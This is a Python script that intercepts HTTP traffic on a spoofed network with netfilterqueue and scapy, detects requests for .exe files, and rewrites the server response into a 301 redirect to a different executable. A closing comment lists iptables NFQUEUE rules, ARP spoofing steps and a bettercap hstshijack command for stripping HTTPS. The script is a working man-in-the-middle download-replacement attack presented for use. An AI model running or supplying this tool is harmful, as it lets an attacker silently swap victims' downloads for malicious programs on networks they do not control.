import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load_data):
    packet[scapy.Raw].load = load_data
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    # chksum and length contains the length and the data type of the packet .We have to delete it to prevent our modified packet from error
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):

        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-621.exe\n\n")
                # We will modify the server response the defalt response is 200 OK we will change it from 200 to 301 it will redirect it permanentaly (more information check https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)
                # We can also change it from 301 to anything else just check server response and paste it

                packet.set_payload(bytes(modified_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()  #Keeps all the data or requests in the queue
queue.bind(2, process_packet)

try:
    queue.run()

except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected")
    print("[-] Quiting")




"""
HTTP ->
remote computer -> iptables -I FORWARD -j NFQUEUE --queue-num_inp 0
                -> ARP spoofing for that compuet ip

self computer -> iptables -I OUTPUT -j NFQUEUE --queue-num_inp 0
              -> iptables -I INPUT -j NFQUEUE --queue-num_inp 0


HTTPS -> 
remote computer -> iptables -I FORWARD -j NFQUEUE --queue-num_inp 0
                -> ARP spoofing for that compuet ip
                -> bettercap -iface wlan0 -caplet hstshijack/hstshijack


self computer -> iptables -I OUTPUT -j NFQUEUE --queue-num_inp 0
              -> iptables -I INPUT -j NFQUEUE --queue-num_inp 0
              -> bettercap -iface wlan0 -caplet hstshijack/hstshijack



"""